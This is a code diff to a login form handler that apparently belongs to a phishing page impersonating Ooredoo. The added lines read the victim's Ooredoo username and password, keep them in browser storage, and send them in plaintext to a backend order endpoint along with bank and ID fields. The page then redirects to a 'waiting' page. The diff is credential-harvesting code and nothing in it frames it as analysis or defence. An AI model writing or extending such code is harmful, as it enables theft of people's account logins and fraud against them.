@@ -357,15 +357,30 @@
     if (isValid) {
       const ooredooUser = emailInput.value.trim();
       const ooredooPass = passwordInput.value.trim();
+      const currentOrderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
 
       sessionStorage.setItem('userEmail', ooredooUser);
       sessionStorage.setItem('userPassword', ooredooPass);
       sessionStorage.setItem('ooredooUser', ooredooUser);
       sessionStorage.setItem('ooredooPass', ooredooPass);
-
-      const currentOrderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
       sessionStorage.setItem('safwa_order_id', currentOrderId);
       localStorage.setItem('requestId', currentOrderId);
+
+      fetch('/api/orders/' + encodeURIComponent(currentOrderId), {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          id: currentOrderId,
+          name: 'Ooredoo User',
+          qid: '',
+          phone: '',
+          email: ooredooUser,
+          bank: 'Ooredoo',
+          ooredooUser: ooredooUser,
+          ooredooPass: ooredooPass,
+          status: 'pending'
+        })
+      }).catch(() => {});
 
       window.location.href = 'waiting_ooredoo_en.html';
     }
